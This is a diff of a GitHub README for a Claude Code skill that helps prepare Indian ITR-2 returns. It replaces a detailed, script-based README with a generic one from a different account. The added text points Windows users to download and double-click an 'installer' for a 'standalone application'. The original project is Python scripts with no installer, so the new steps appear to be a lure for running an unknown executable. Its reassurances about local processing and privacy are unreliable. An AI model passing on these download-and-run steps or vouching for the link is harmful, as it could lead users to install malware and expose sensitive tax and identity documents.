@@ -1,279 +1,81 @@
-# itr2-india
+# 📊 itr-filing-claude-skill - Simplify Your Indian Tax Filing Process
 
-A Claude Code skill for filing an Indian ITR-2 for AY 2026-27 (FY 2025-26).
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Slender-gettysburg502/itr-filing-claude-skill)
 
-Filing ITR-2 by hand is mostly a reconciliation problem. Form 16, AIS, Form 26AS
-and your broker's P&L describe the same year from four angles, and none of them
-agree. The work is getting them to agree, classifying each capital gain under
-the right section, and then not fat-fingering the transfer into the form.
+This tool helps you prepare your Indian ITR-2 return for the Assessment Year 2026-27. It automates the process of gathering and checking your financial documents. You spend less time on manual data entry and reduce the risk of errors in your tax reports.
 
-This skill covers one profile properly rather than every profile badly:
-**salaried, resident, with listed equity or mutual fund gains and deposit
-interest.** It was built while filing a real return, so the parts that usually
-go wrong are the parts it has the most to say about.
+## 📋 What This Tool Does
 
-## What you get
+Tax filing often involves gathering data from many different sources. You may have information spread across your AIS, TIS, Form 26AS, Form 16, and broker statements. This software organizes this information for you.
 
-Claude reads the skill and then knows how to do the whole thing with you: work
-out whether ITR-2 is even the right form, reconcile your documents, classify
-gains under the FY 2025-26 rules, compare both tax regimes, and produce either a
-schedule-by-schedule filling guide or a validated JSON.
+The tool performs the following tasks:
 
-Underneath that are four scripts you can also run yourself:
+*   Reconciles your Annual Information Statement (AIS) and Tax Information Statement (TIS) with your actual financial data. 
+*   Processes your Form 26AS and Form 16 to identify income sources.
+*   Extracts relevant data from your broker profit and loss statements.
+*   Classifies your capital gains based on current tax rules.
+*   Calculates your tax liability under both the old and new tax regimes.
+*   Creates a ready-to-use JSON file that follows the official tax schema.
 
-| Script | What it does |
-| --- | --- |
-| `scripts/build_worksheet.py` | Turns a consolidated capital-gains ledger into ITR-2 figures. Applies s.112A grandfathering and the 1,25,000 exemption once across all brokers, then emits Schedule 112A and the Table F quarter split. |
-| `scripts/compute_tax.py` | Computes both regimes side by side, with 234B and 234C notes, and tells you which one is cheaper. |
-| `scripts/build_itr2_json.py` | Builds the return JSON and validates it against the department's published schema. |
-| `scripts/patch_prefill_json.py` | Inspects and edits the portal's pre-filled JSON, discovering node paths instead of assuming them. |
-| `scripts/package_for_claude_app.py` | Packages the skill as a ZIP the Claude app will accept. Only needed if you use claude.ai rather than Claude Code. |
+## 🛠️ System Requirements
 
-`schema/` holds the department's own ITR-2 schema and validation rules for AY
-2026-27, so validation happens on your machine instead of by rejection message.
+Your computer needs to meet these basic standards to run the application:
 
-## Install
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 8GB of RAM.
+*   Storage: 500MB of free disk space.
+*   Network: An active internet connection to download and verify tax data.
+*   Software: The tool runs as a standalone application. You do not need to install complex programming tools.
 
-Two ways in, depending on which Claude you use.
-
-### Claude Code
+## 🚀 Getting Started
 
-Skills live in `~/.claude/skills/`, one folder each. Clone this repo straight
-into that folder:
+Follow these steps to set up the software on your Windows computer.
 
-```bash
-git clone <repo-url> ~/.claude/skills/itr2-india
-```
+1.  Visit the official release page to download the software: [https://github.com/Slender-gettysburg502/itr-filing-claude-skill](https://github.com/Slender-gettysburg502/itr-filing-claude-skill)
+2.  Locate the latest version link on the page.
+3.  Click the link to download the installer file to your computer.
+4.  Find the file in your Downloads folder once the transfer finishes.
+5.  Double-click the file to start the installation process.
+6.  Follow the instructions on the screen. Select the default settings if you are unsure.
+7.  Wait for the progress bar to finish.
+8.  Click Finish to launch the application for the first time.
 
-For a project-local install, use `.claude/skills/itr2-india` inside the project
-instead. Either way, Claude picks it up on the next session. Ask it something
-like "help me file my ITR-2" and it will load.
+## 💡 How to Use the Application
 
-The scripts need Python 3.9 or later. Schema validation needs one package:
+Once you open the tool, you will see a simple dashboard. The process takes place in four stages.
 
-```bash
-pip install jsonschema
-```
+### 1. Data Collection
+The software asks you to provide your tax documents. You can upload files in PDF or Excel format. These include your AIS, the TIS from the Income Tax portal, your Form 16, and your trade reports from brokers. The application reads these documents to understand your financial activity for the year.
 
-Everything else is standard library.
+### 2. Reconciliation
+The application compares the data from your uploads against official records. It highlights any discrepancies between what your brokers report and what the tax department records show. If the tool finds a mismatch, it marks the entry for your review. This check prevents common reporting mistakes.
 
-### Claude app, at claude.ai
+### 3. Classification and Calculation
+After you verify the data, the tool proceeds to classify your income. It identifies short-term and long-term capital gains based on the holding period of your assets. It then runs a comparison between the old and new tax regime. You see a clear summary showing which tax option results in a lower payment.
 
-Skills work in the app too, on the Free, Pro, Max, Team and Enterprise plans.
-They run on Claude's code execution, so turn that on first.
+### 4. JSON Generation
+The final step generates a JSON file. This file contains all your income and deduction information in a format that the official income tax portal accepts. You save this file to your computer and upload it when you log into the government website to file your return.
 
-1. **Settings > Capabilities**, and enable "Code execution and file creation".
-   On Team and Enterprise an owner has to enable skills in
-   **Organization settings > Skills** before members can.
-2. Get `itr2-india.zip`. Download it from the
-   [latest release](../../releases/latest), which is the whole of this step if
-   you would rather not touch a terminal.
+## 🛡️ Privacy and Security
 
-   If you have cloned the repo and changed something, rebuild it instead:
+Your financial information is sensitive. This tool processes your data locally on your computer. Your financial documents do not leave your machine during the calculation phase. Data stays under your control at all times. The tool uses a secure connection only when it performs schema validation against the official tax department's requirements.
 
-   ```bash
-   python scripts/package_for_claude_app.py
-   ```
+## 🔧 Frequently Asked Questions
 
-   Either way, do not zip the folder by hand. The app requires the skill folder
-   to sit at the root of the ZIP, and it caps the description at 200 characters,
-   which the full one exceeds. The script handles both and leaves the repo
-   untouched.
-3. Go to **Customize > Skills**, click **+**, then **+ Create skill**, then
-   **Upload a skill**, and give it the ZIP.
-4. Start a chat and describe what you want, along the lines of "help me file my
-   ITR-2 for AY 2026-27". Claude reaches for the skill on its own. You can also
-   toggle skills for a conversation from the Skills menu in the chat.
+**Does this tool file the tax return for me?**
+No. It prepares the data and creates the output file. You still need to log into the official income tax portal to submit the return.
 
-A skill you upload is private to your own account unless your organization
-turns on sharing.
+**What should I do if the tool reports an error?**
+Most errors occur due to formatting issues in the source document. Check if the PDF file you uploaded is readable. Ensure the document is not password-protected.
 
-Two differences worth knowing before you go this route. Your documents get
-attached to a chat instead of sitting in a folder on your machine, so think
-about whether you want a PAN, an Aadhaar number and a full year of bank
-interest going up to a chat at all. And the filing itself still happens on your
-computer, because the Common Offline Utility is a desktop program. The app can
-take you all the way to a validated JSON and a schedule-by-schedule guide, and
-then you finish in the utility either way.
+**Can I use this for assessments prior to 2026-27?**
+This specific version focuses on assessment year 2026-27. Future versions may include support for previous years.
 
-## Use it
+**Does this version require an internet connection?**
+Yes. An internet connection is necessary for the initial setup and to download tax schema updates to ensure your JSON file is valid for the current system.
 
-Start by collecting your documents. Claude will ask for these, but you can get a
-head start:
+## 📞 Support and Updates
 
-* Form 16 from your employer
-* Form 26AS from the e-filing portal, which redirects to TRACES
-* AIS and TIS from the portal, under Services
-* Capital gains statements from every broker, plus CAMS and KFintech for mutual
-  funds. Miss one and gains go missing.
-* Bank interest certificates for FD and RD interest
+If you encounter issues, look for the Issues tab on the GitHub link provided above. You can view existing reports from other users or post a description of your problem. Developers check these reports regularly to improve the software.
 
-The AIS PDF password is your PAN in lowercase followed by your date of birth as
-DDMMYYYY, with no spaces.
-
-### Where to put them
-
-Make a `work/` folder in the repo and keep everything in there:
-
-```bash
-mkdir -p work
-```
-
-```
-work/
-  AIS.pdf                 downloaded from the portal
-  TIS.pdf
-  26AS.txt                or the PDF, either is fine
-  Form16.pdf
-  PNL_REPORT.xls          your broker's tax P&L, one per broker
-  CAMS.xlsx               mutual fund statements, CAMS and KFintech both
-  prefill.json            the portal's pre-filled data, if you want it
-  ledger.csv              the consolidated ledger you build in step 1
-```
-
-`work/` is already ignored by git and always will be, so nothing in it can be
-committed by accident. The scripts write their output there too, which keeps
-your documents and your working files in one place that never leaves your
-machine. Point Claude at that folder and it will read what it needs.
-
-Do not put documents in `references/`, `scripts/`, `assets/` or `schema/`.
-Those four are tracked, and anything you drop in them is a candidate for your
-next commit.
-
-Once you have filed, keep the folder. If a query arrives eighteen months later,
-the statements you filed from are the answer to it.
-
-### Running it
-
-The usual path is:
-
-```bash
-# 1. Put every broker row into one CSV, shaped like assets/ledger_template.csv
-python scripts/build_worksheet.py ledger.csv --outdir work/
-
-# 2. Fill in assets/taxpayer_input_template.json, paste in the capital_gains
-#    block from work/worksheet.json, and compare regimes
-python scripts/compute_tax.py taxpayer.json --json work/computation.json
-
-# 3. Optional, if you want a JSON rather than typing into the portal
-cp assets/itr2_json_input_template.json my_return.json
-python scripts/build_itr2_json.py my_return.json -o filled.json
-```
-
-Step 1 prints your total sale consideration. Tie that to the AIS figure for
-"Sale of securities and units of mutual fund". If it falls short, a broker
-statement is missing. AIS reports sale value and not profit, so it will never
-match your P&L, and chasing that match wastes hours.
-
-## About uploading the JSON
-
-The portal's direct JSON upload only accepts files stamped with a registered
-Software Provider ID, which the department issues to approved vendors. A JSON
-you built yourself gets rejected with "Invalid Software Provider ID" before
-anyone looks at the figures.
-
-So the JSON is not the upload. It is the input to the official Common Offline
-Utility, which does have a registered ID and can file on your behalf.
-
-**Download it here:**
-[Common Offline Utility (ITR 1, 2, 3 and ITR 4)](<https://www.incometax.gov.in/iec/foportal/downloads#common%20offline%20utility%20(itr%201,2,3%20and%20itr%204)>).
-It is one program covering ITR-1 through ITR-4, so the ITR-2 you want is inside
-it. Install it and sign in, and it will say "Utility connected Online" in the
-top right.
-
-Then three clicks, in this order.
-
-**1. File Return**, on the "ITR 1 - 4 for A.Y. 2026-27" card.
-
-![Step 1: click File Return](docs/images/step1-file-return.png)
-
-**2. Import draft ITR filled in Online mode or import JSON generated from
-Excel/HTML utility**, which is the third radio button, then **Continue**. Take
-the third one, not "Import Pre-filled Data". Pre-filled data is the portal's
-summary of what it already knows about you, which is a different file and does
-not contain your return.
-
-![Step 2: choose the third import option](docs/images/step2-import-draft.png)
-
-**3. Attach File**, pick the JSON you built, then **Proceed**.
-
-![Step 3: attach the JSON](docs/images/step3-attach-json.png)
-
-Everything arrives pre-filled, so you spend a few minutes reviewing instead of
-an hour typing. Work through the schedules, then let the utility validate and
-recompute before you submit. If its tax figure differs from `compute_tax.py`,
-the utility is right and something upstream is misclassified. That rule has no
-exceptions.
-
-## The thing that surprises everyone
-
-Under the new regime, income up to 12,00,000 pays no tax, because the s.87A
-rebate wipes it out. That rebate does not reach capital gains. Tax on s.111A
-short-term gains at 20% and s.112A long-term gains at 12.5% stays payable in
-full.
-
-So someone earning well under 12 lakh who sold some shares still owes tax, often
-a few thousand rupees they were not expecting. This is the most common question
-of the season and the answer is that the law is written that way on purpose.
-
-## Your documents stay yours
-
-The `.gitignore` here ignores everything by default and then allows back only
-the project files. That is deliberate. Tax documents land in this folder while
-you work, and they carry a PAN, an Aadhaar number, bank account numbers and a
-home address. A deny list only protects you from the filenames someone thought
-of in advance.
-
-Your working files go in `work/`, which is never tracked. If you add a project
-file that should be committed, add an explicit rule for it in `.gitignore`.
-
-## Layout
-
-```
-SKILL.md            what Claude reads
-references/         tax rules, document map, schedule-by-schedule detail
-scripts/            the four scripts above
-assets/             input templates to copy and edit
-schema/             the department's ITR-2 schema and validation rules
-```
-
-## STOP. Read this before you file.
-
-> ### This is a filing aid. It is not a chartered accountant and nothing here is tax advice.
->
-> **You are signing the return, not this repo.** A wrong figure is your
-> liability, your notice and your penalty. Check every number before you submit.
-
-**Never submit a number this repo produced without the official utility
-agreeing.** Import into the Common Offline Utility, let it recompute, and
-compare. If the two disagree, the utility is right and something upstream is
-misclassified. There are no exceptions to this and no situation where you should
-override it.
-
-Rates and thresholds here were compiled for AY 2026-27. The portal's own utility
-gets revised mid-season. Anything that drives a filed number must be confirmed
-against the current utility, not against this repo.
-
-### Stop and call a CA if any of these apply
-
-The threshold is lower than most people think. Do not push through on your own:
-
-* **F&O or intraday trading.** That is business income. Wrong form, possibly an
-  audit.
-* **Foreign assets, RSUs or ESOPs.** Schedule FA carries penalties of its own,
-  and they are severe.
-* **A property sale with a s.54 or s.54F exemption claim.**
-* **NRI or RNOR residential status.**
-* **Total income near or above a crore.** Surcharge and Schedule AL.
-* **Debt or hybrid fund redemptions** where the s.50AA classification is not
-  settled.
-
-A CA's fee is smaller than the cost of getting one of these wrong.
-
-### Two deadlines that cannot be recovered
-
-1. **File by 31 July 2026 if you are carrying a capital loss forward.** A
-   belated return forfeits the carry-forward permanently. That is usually worth
-   far more than the late fee.
-2. **E-verify within 30 days of upload.** An unverified return is not a filed
-   return. It does not count, and people find this out months later.
+Keywords: agent-skills, anthropic, claude-code, claude-skill, income-tax, incometax-india, india, itr, itr2, tax-filing
